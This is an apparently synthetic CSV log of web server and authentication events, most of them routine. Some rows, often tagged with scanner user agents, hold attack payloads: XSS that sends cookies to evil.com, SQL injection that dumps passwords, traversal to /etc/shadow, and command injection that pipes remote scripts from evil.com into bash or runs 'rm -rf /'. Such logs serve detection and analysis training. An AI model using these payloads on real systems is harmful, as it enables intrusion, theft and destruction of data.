event_id,timestamp,event_type,source_ip,user_agent,endpoint,http_method,query_params,username,auth_result,failure_reason,dest_port,protocol,connection_result,response_code,response_time_ms
c8c76762-da2e-452b-8deb-b8baf7418d3b,2024-12-01T21:15:35.088451Z,HTTP_REQUEST,23.129.64.100,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",/api/profile,POST,comment=<script>alert('XSS')</script>,,,,,,,200,82
2dee09b6-a850-4c7f-ab3b-4451796aa845,2024-12-01T21:18:19.403706Z,AUTH_ATTEMPT,10.0.0.50,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",/login,POST,,james.jackson,SUCCESS,,,,,200,175
4ecc86e7-5c81-4833-bc83-de49c883e483,2024-12-01T21:20:23.016270Z,HTTP_REQUEST,172.16.0.11,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/api/products,GET,,,,,,,,200,112
804add98-e1dc-4fa7-8257-fa1710aeb171,2024-12-01T21:23:06.729685Z,HTTP_REQUEST,192.168.1.101,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",/login,GET,,,,,,,,200,392
9b8dac02-ce1f-4ca1-b2be-165ef052d1b7,2024-12-01T21:26:39.044292Z,HTTP_REQUEST,10.0.0.54,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,/docs,POST,,,,,,,,201,244
1eceb2b0-829b-4490-94e2-24d71b8ac351,2024-12-01T21:30:10.488270Z,HTTP_REQUEST,10.0.0.51,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",/api/dashboard,POST,,,,,,,,200,48
950d2726-05ca-4370-b7e3-857155c977ce,2024-12-01T21:31:59.234541Z,HTTP_REQUEST,89.248.167.131,Nikto/2.5.0,/api/diagnostic,GET,host=localhost; rm -rf /,,,,,,,200,3754
7309d112-534c-460b-8e57-cdf488a3d49a,2024-12-01T21:33:06.075223Z,HTTP_REQUEST,10.0.0.50,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",/api/users,GET,,,,,,,,201,331
db11fd8b-9d34-4e00-9346-b40466c0dc1f,2024-12-01T21:37:37.981451Z,HTTP_REQUEST,192.168.1.104,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",/api/profile,GET,,,,,,,,200,221
7b00eba8-1870-493d-aa2b-b7ff697ff259,2024-12-01T21:38:50.467042Z,HTTP_REQUEST,10.0.0.52,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,/api/profile,GET,,,,,,,,204,277
8fc67499-2314-4fa4-bd85-405105a9c03e,2024-12-01T21:41:19.110178Z,AUTH_ATTEMPT,172.16.0.12,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/logout,POST,,nicole.clark,LOGOUT,,,,,200,48
b15383e9-e21d-47df-8078-955bdd4121b5,2024-12-01T21:43:30.931625Z,HTTP_REQUEST,10.0.0.51,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",/api/settings,GET,,,,,,,,201,130
3f85d8a6-3853-4bcf-a121-8b02c0b205c4,2024-12-01T21:48:37.163944Z,HTTP_REQUEST,192.168.1.101,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",/contact,GET,,,,,,,,200,189
dea8c456-bd2b-4d11-a7b9-2c2df4f39ec5,2024-12-01T21:50:43.617733Z,HTTP_REQUEST,172.16.0.12,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,/api/profile,GET,,,,,,,,201,209
f382606d-0872-40b4-9e57-4f478cc76bc3,2024-12-01T21:54:29.649789Z,HTTP_REQUEST,10.0.0.50,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/api/analytics,GET,,,,,,,,200,382
3b297cc8-dbc1-496d-9e08-4df52a3add4f,2024-12-01T21:57:44.039638Z,AUTH_ATTEMPT,192.168.1.101,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",/logout,POST,,sarah.johnson,LOGOUT,,,,,200,51
5192754d-465e-4907-9270-2bf6a50f26a7,2024-12-01T22:00:53.220064Z,HTTP_REQUEST,192.168.1.102,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",/docs,GET,,,,,,,,200,54
e4bab4ab-a60d-4a23-8bbe-04021602d08b,2024-12-01T22:05:10.652518Z,AUTH_ATTEMPT,10.0.0.50,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/logout,POST,,daniel.garcia,LOGOUT,,,,,200,41
5304b5fd-8905-41da-9469-08fed6b4843c,2024-12-01T22:07:12.046113Z,HTTP_REQUEST,10.0.0.52,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",/about,POST,,,,,,,,200,324
dc9b08fc-4e2a-490e-8fb6-637ad325ab09,2024-12-01T22:10:39.508537Z,AUTH_ATTEMPT,172.16.0.11,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",/logout,POST,,jessica.martinez,LOGOUT,,,,,200,64
865b3ddf-2356-469b-a86f-81691c66c817,2024-12-01T22:11:12.163747Z,AUTH_ATTEMPT,192.168.1.102,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",/login,POST,,emily.davis,SUCCESS,,,,,200,140
650af7d0-4625-4c9c-a0d0-98864124b1f9,2024-12-01T22:11:50.322166Z,HTTP_REQUEST,45.129.56.200,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",/api/orders,GET,"search=' UNION SELECT username,password FROM users --",,,,,,,500,1295
8ac7cf28-9e70-48ba-a301-2a25290b31f4,2024-12-01T22:14:04.949350Z,HTTP_REQUEST,172.16.0.13,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",/home,GET,,,,,,,,204,125
bddec3d6-bcce-4cc5-8fee-7519b98aa51a,2024-12-01T22:15:43.389536Z,AUTH_ATTEMPT,192.168.1.100,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/logout,POST,,john.doe,LOGOUT,,,,,200,79
c909587e-b727-488b-b677-11b9852dec6f,2024-12-01T22:17:07.703713Z,AUTH_ATTEMPT,172.16.0.11,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,/login,POST,,mike.wilson,SUCCESS,,,,,200,215
abae4f84-f0d5-4060-8e38-933dfd29c544,2024-12-01T22:20:17.975706Z,HTTP_REQUEST,172.16.0.13,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",/api/notifications,POST,,,,,,,,200,289
48332844-1dfc-45cd-b57c-eba5c4ff313e,2024-12-01T22:21:08.114834Z,AUTH_ATTEMPT,10.0.0.50,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",/login,POST,,david.brown,SUCCESS,,,,,200,238
301cfb02-eaa2-4d6a-bb73-cc44d7e94162,2024-12-01T22:21:36.149089Z,HTTP_REQUEST,195.54.160.149,Nikto/2.5.0,/api/ping,GET,host=localhost; rm -rf /,,,,,,,200,4846
12f65303-2401-48a9-b232-3ab3be414384,2024-12-01T22:25:57.285957Z,AUTH_ATTEMPT,10.0.0.54,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,/login,POST,,james.jackson,SUCCESS,,,,,200,94
520221c6-53ed-4495-a045-ff938aa87deb,2024-12-01T22:30:19.249598Z,HTTP_REQUEST,10.0.0.54,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",/help,GET,,,,,,,,200,106
f607159b-1ad0-4f1f-aafe-af89d5c01a02,2024-12-01T22:32:45.748313Z,HTTP_REQUEST,10.0.0.50,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",/api/profile,POST,,,,,,,,200,249
a23cb2bc-3ec5-4e27-821b-3d9dc90d7f8e,2024-12-01T22:35:00.775425Z,HTTP_REQUEST,172.16.0.14,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,/logout,POST,,,,,,,,200,91
47b41123-1843-4dc5-b402-1fe296b700a5,2024-12-01T22:35:02.236494Z,HTTP_REQUEST,89.248.167.131,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",/api/orders,GET,id=1' OR '1'='1' --,,,,,,,500,676
a553c6f6-2a92-400e-899c-db229bd5cc6d,2024-12-01T22:39:14.656506Z,HTTP_REQUEST,172.16.0.10,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,/help,GET,,,,,,,,200,168
e5a47d7e-d47a-48a3-898e-cdebfd289380,2024-12-01T22:43:21.374101Z,HTTP_REQUEST,10.0.0.52,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,/login,GET,,,,,,,,200,167
5d30dbd6-31e8-4174-be57-e6537f6473aa,2024-12-01T22:47:34.140035Z,HTTP_REQUEST,172.16.0.10,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/api/profile,GET,,,,,,,,204,338
04253853-86dd-4c6c-8350-68e9603128af,2024-12-01T22:49:47.061420Z,HTTP_REQUEST,172.16.0.12,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",/api/analytics,GET,,,,,,,,200,101
9fe83da1-9821-4186-9aac-9fbc7f784c95,2024-12-01T22:50:41.912975Z,AUTH_ATTEMPT,10.0.0.52,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,/logout,POST,,john.doe,LOGOUT,,,,,200,81
b6e3c268-b80a-4e1f-ad94-f0d06e3c9e7b,2024-12-01T22:52:52.932383Z,HTTP_REQUEST,172.16.0.14,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,/about,GET,,,,,,,,200,69
42eafe1d-4d55-44e8-8c05-d386fbc84481,2024-12-01T22:55:32.483132Z,AUTH_ATTEMPT,10.0.0.51,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",/login,POST,,robert.anderson,SUCCESS,,,,,200,124
435c73f1-2d32-4aec-9a29-c68f12f3d3cb,2024-12-01T22:56:27.354994Z,HTTP_REQUEST,192.168.1.104,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/about,POST,,,,,,,,204,161
bfa4e664-c58e-433a-9b4a-02bac8998d4d,2024-12-01T23:01:12.130213Z,AUTH_ATTEMPT,10.0.0.52,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",/logout,POST,,mike.wilson,LOGOUT,,,,,200,96
dd480f7c-59eb-4f37-b812-2e65a2913b40,2024-12-01T23:06:51.916137Z,HTTP_REQUEST,192.168.1.104,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,/api/users,GET,,,,,,,,201,132
013e550e-a5cc-4024-bb3a-9cb434f4b2f9,2024-12-01T23:07:07.335405Z,AUTH_ATTEMPT,172.16.0.14,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",/login,POST,,jessica.martinez,SUCCESS,,,,,200,82
ccf0efdf-9612-4736-b5b5-3de48a509383,2024-12-01T23:11:46.231712Z,AUTH_ATTEMPT,172.16.0.11,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,/login,POST,,matthew.robinson,SUCCESS,,,,,200,90
9c219869-c194-431d-b5ef-c222bdef4490,2024-12-01T23:15:59.198836Z,AUTH_ATTEMPT,10.0.0.50,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,/login,POST,,david.brown,SUCCESS,,,,,200,150
8551777e-9878-4668-bd5e-aeb8c11ffe11,2024-12-01T23:20:09.977453Z,HTTP_REQUEST,172.16.0.12,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",/api/products,GET,,,,,,,,200,134
6e9d6804-c01e-4941-9964-a95b0d769247,2024-12-01T23:23:57.129606Z,HTTP_REQUEST,192.168.1.102,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,/api/products,GET,,,,,,,,200,279
47146266-4f47-4a06-b5c5-c4d3e560cd60,2024-12-01T23:24:14.134242Z,HTTP_REQUEST,10.0.0.53,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,/api/users,GET,,,,,,,,200,233
046f71c9-29a4-4bc6-9240-5c84e0d0d328,2024-12-01T23:26:10.391420Z,HTTP_REQUEST,10.0.0.50,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",/api/reports,GET,,,,,,,,200,310
0c143cce-c004-4b2e-96f7-85d363a1de09,2024-12-01T23:28:28.549761Z,HTTP_REQUEST,172.16.0.10,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,/api/analytics,GET,,,,,,,,200,124
f7707972-4d0c-4a50-8ae1-d9c54f1e7c6e,2024-12-01T23:33:37.795823Z,AUTH_ATTEMPT,10.0.0.50,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",/login,POST,,michael.harris,SUCCESS,,,,,200,138
1fb794ad-a1ff-4d8a-b5f9-06eedff1787c,2024-12-01T23:37:16.117382Z,HTTP_REQUEST,10.0.0.54,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",/contact,GET,,,,,,,,201,253
c9797693-9bc5-4ced-9b52-97f90b619aa3,2024-12-01T23:38:43.078054Z,AUTH_ATTEMPT,172.16.0.12,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",/login,POST,,emily.davis,SUCCESS,,,,,200,219
630bc37c-c780-4642-bd14-1c9d73b5dca8,2024-12-01T23:39:36.571901Z,AUTH_ATTEMPT,10.0.0.54,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",/login,POST,,mike.wilson,SUCCESS,,,,,200,175
c0e83e00-17ee-456c-b612-f3519b36f1e9,2024-12-01T23:44:45.871339Z,HTTP_REQUEST,172.16.0.14,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",/help,GET,,,,,,,,204,290
266a038c-1c26-479c-be28-764ec198ced4,2024-12-01T23:46:37.631182Z,AUTH_ATTEMPT,192.168.1.102,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",/login,POST,,emily.davis,SUCCESS,,,,,200,89
f6c2f231-5cf8-40be-8d34-5a9a06701fe9,2024-12-01T23:49:15.870109Z,AUTH_ATTEMPT,192.168.1.102,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",/login,POST,,stephanie.lewis,SUCCESS,,,,,200,121
0cd09c08-6abd-4fef-a3e9-4c236cace57a,2024-12-01T23:51:02.284581Z,HTTP_REQUEST,10.0.0.50,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/help,GET,,,,,,,,200,158
f5f77d5f-622a-496b-8ec6-fae402b81279,2024-12-01T23:53:01.135513Z,HTTP_REQUEST,172.16.0.10,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",/api/settings,POST,,,,,,,,200,167
def5e951-2a88-4e99-a2cf-1abac6e6da37,2024-12-01T23:55:36.160508Z,HTTP_REQUEST,192.168.1.100,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",/api/search,GET,,,,,,,,201,151
6427891c-300e-4203-b596-f799775ee402,2024-12-01T23:58:21.292373Z,HTTP_REQUEST,192.168.1.103,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",/api/settings,GET,,,,,,,,200,162
0dc63780-af0d-4db8-a17b-74c90d86a56f,2024-12-01T23:59:17.809484Z,HTTP_REQUEST,10.0.0.52,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/api/settings,POST,,,,,,,,200,106
59dcd6eb-0db9-4212-bb0e-08f827e4899c,2024-12-02T00:00:28.289549Z,HTTP_REQUEST,192.168.1.102,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",/login,POST,,,,,,,,200,366
3c408b0b-ec5e-4a3f-ad2a-0ece520b87ff,2024-12-02T00:05:57.683610Z,HTTP_REQUEST,192.168.1.103,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",/api/search,POST,,,,,,,,200,273
e6da0703-1860-4a37-a71b-fece184be1b7,2024-12-02T00:08:23.181673Z,AUTH_ATTEMPT,192.168.1.100,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",/login,POST,,emily.davis,SUCCESS,,,,,200,239
a377276a-4951-493e-ad0c-8c7c3882c61b,2024-12-02T00:13:29.688088Z,HTTP_REQUEST,10.0.0.53,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",/about,GET,,,,,,,,200,108
9fd60aab-e0f6-4bd0-bd12-096751847cbe,2024-12-02T00:14:48.072334Z,HTTP_REQUEST,10.0.0.50,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",/about,GET,,,,,,,,200,184
48e4eaa7-dab0-410c-b45b-6769f57794f8,2024-12-02T00:15:39.321247Z,HTTP_REQUEST,10.0.0.50,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,/help,POST,,,,,,,,200,305
906aea67-6d80-4a52-bdea-c3ca2bfa8523,2024-12-02T00:19:25.853208Z,AUTH_ATTEMPT,10.0.0.53,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",/logout,POST,,amanda.taylor,LOGOUT,,,,,200,84
b770aed9-e676-4fbb-8b9a-dd19f47f62ef,2024-12-02T00:21:45.879004Z,HTTP_REQUEST,192.168.1.101,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,/api/orders,GET,,,,,,,,204,340
bfdce840-8b8e-42ee-8233-9da453d16f64,2024-12-02T00:51:12.094051Z,HTTP_REQUEST,45.129.56.200,masscan/1.3.2,/files/../../../etc/passwd,GET,,,,,,,,403,5
d30d153b-c78b-43ac-a7c3-2cc2a0cf277d,2024-12-02T01:15:53.335035Z,HTTP_REQUEST,185.220.101.45,Nikto/2.5.0,/api/orders,POST,search=' AND SLEEP(5) --,,,,,,,403,968
7f30320f-ebbd-4001-8165-b54ca2342be2,2024-12-02T01:27:58.040710Z,HTTP_REQUEST,5.188.206.13,sqlmap/1.7.2#stable (https://sqlmap.org),/api/exec,GET,host=localhost$(wget -O- http://evil.com/c2.sh),,,,,,,500,2920
718cd2e7-6b4c-43a4-a4fb-3ecdde9e4878,2024-12-02T01:38:37.454535Z,HTTP_REQUEST,172.16.0.13,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/api/profile,GET,comment=<iframe src='javascript:alert(1)'>,,,,,,,400,85
7aa1ea9b-d1ca-4cb1-a463-6727d81dfb37,2024-12-02T01:47:06.401724Z,HTTP_REQUEST,162.247.74.27,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",/api/products,GET,id='; EXEC xp_cmdshell('whoami'); --,,,,,,,200,899
8069abbe-4493-4606-bcfa-887655b5d280,2024-12-02T01:55:29.116319Z,HTTP_REQUEST,185.220.101.45,Nikto/2.5.0,/files/....//....//....//etc/shadow,GET,,,,,,,,200,6
bb4d311b-7beb-42c1-a550-d55fe3f88863,2024-12-02T02:16:33.568058Z,HTTP_REQUEST,185.220.101.45,masscan/1.3.2,/api/search,POST,id=' OR '1'='1,,,,,,,500,660
5d90be5f-67a8-4a17-87ae-263ac2536151,2024-12-02T02:18:54.098265Z,HTTP_REQUEST,192.168.1.104,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,/api/comments,POST,q=<img src=x onerror=alert(document.cookie)>,,,,,,,200,25
26649e90-67d4-4447-a6f1-3f0dd2f88ec3,2024-12-02T03:04:12.896750Z,HTTP_REQUEST,193.32.162.159,Nmap Scripting Engine,/api/orders,GET,id=' AND SLEEP(5) --,,,,,,,500,1167
f40a8952-bc03-403e-9541-0af4fdb8acd0,2024-12-02T03:17:34.563636Z,HTTP_REQUEST,89.248.167.131,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",/api/search,POST,comment=<img src=x onerror=alert(document.cookie)>,,,,,,,400,25
6647d27b-716f-40cf-a82a-f55f1f2057b7,2024-12-02T03:24:11.926373Z,HTTP_REQUEST,209.141.47.245,Nikto/2.5.0,/api/ping,GET,host=localhost& powershell -enc JABjAD0=,,,,,,,200,381
66a8e2b5-2a78-44b5-936e-cc8267fe939e,2024-12-02T03:44:11.932662Z,HTTP_REQUEST,10.0.0.54,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",/api/profile,POST,q=<svg onload=fetch('http://evil.com/steal?c='+document.cookie)>,,,,,,,400,131
dbd9b98a-c676-4d58-8caf-381853267ca8,2024-12-02T03:45:41.832795Z,HTTP_REQUEST,185.156.73.54,Nmap Scripting Engine,/files/%2e%2e%2f%2e%2e%2f%2e%2e%2fvar/log/auth.log,GET,,,,,,,,403,29
205153fc-9ff4-439f-bee2-e4294b566c61,2024-12-02T04:27:20.684911Z,HTTP_REQUEST,192.168.1.101,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,/api/search,GET,q=<iframe src='javascript:alert(1)'>,,,,,,,200,146
ffc24c9f-5e71-4036-ad7c-8d9cf1b1c16a,2024-12-02T04:46:18.600261Z,HTTP_REQUEST,192.168.1.100,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",/api/users/delete,POST,,,,,,,,403,54
7af7d90a-05cb-4427-8b97-bc59b99cf5f2,2024-12-02T04:56:12.589636Z,HTTP_REQUEST,89.248.167.131,masscan/1.3.2,/api/diagnostic,GET,host=localhost`curl http://evil.com/malware.sh | bash`,,,,,,,500,1480
26968624-d79f-49f4-aa03-19fe9e8de0e5,2024-12-02T05:17:40.189241Z,HTTP_REQUEST,91.92.109.87,sqlmap/1.7.2#stable (https://sqlmap.org),/api/search,POST,"search=' UNION SELECT username,password FROM users --",,,,,,,500,1659
8630a4fd-9b23-46e5-9eb6-5dc94fb155fc,2024-12-02T06:08:54.645516Z,HTTP_REQUEST,10.0.0.54,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",/api/config,GET,,,,,,,,200,46
96a1dfac-8ef1-4474-98e3-80bf8f6280f2,2024-12-02T06:25:17.111515Z,HTTP_REQUEST,172.16.0.10,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",/api/users/delete,POST,,,,,,,,200,11
